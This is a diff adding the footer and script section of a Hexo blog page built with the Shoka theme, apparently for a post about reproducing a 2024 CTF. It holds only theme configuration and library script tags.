+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/10/27/SHctf复现2024/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
